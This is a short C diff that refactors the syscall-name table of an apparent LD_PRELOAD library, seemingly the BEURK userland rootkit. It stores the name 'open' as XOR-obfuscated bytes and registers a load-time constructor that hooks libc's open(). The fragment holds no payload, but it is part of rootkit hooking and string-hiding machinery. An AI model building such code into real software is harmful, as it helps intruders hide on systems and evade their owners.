@@ -25,17 +25,17 @@
 
 /* library constructor */
 
-# define LENGTH_SYSCALL	8
-# define SYSCALL_OPEN	"\x91\x8e\x9b\x90"
-# define NUM_SYSCALL	1
-# define SYS_OPEN		0
+# define MAX_SYSCALL_SIZE   10
+# define SYSCALL_OPEN       { 0x91, 0x8e, 0x9b, 0x90, 0x00 }
+# define NUM_SYSCALLS       1
+# define SYS_OPEN           0
 
 # define REAL_OPEN(args...) (beurk_syscalls_list[SYS_OPEN](args))
 
-static char		*beurk_syscalls_table[NUM_SYSCALL] = {
-	SYSCALL_OPEN
+static char         beurk_syscalls_table[NUM_SYSCALLS][MAX_SYSCALL_SIZE] = {
+    SYSCALL_OPEN
 };
 
-static void		*(*beurk_syscalls_list[NUM_SYSCALL])();
+static void         *(*beurk_syscalls_list[NUM_SYSCALLS])();
 
-static void     init(void) __attribute__((constructor));
+static void         init(void) __attribute__((constructor));
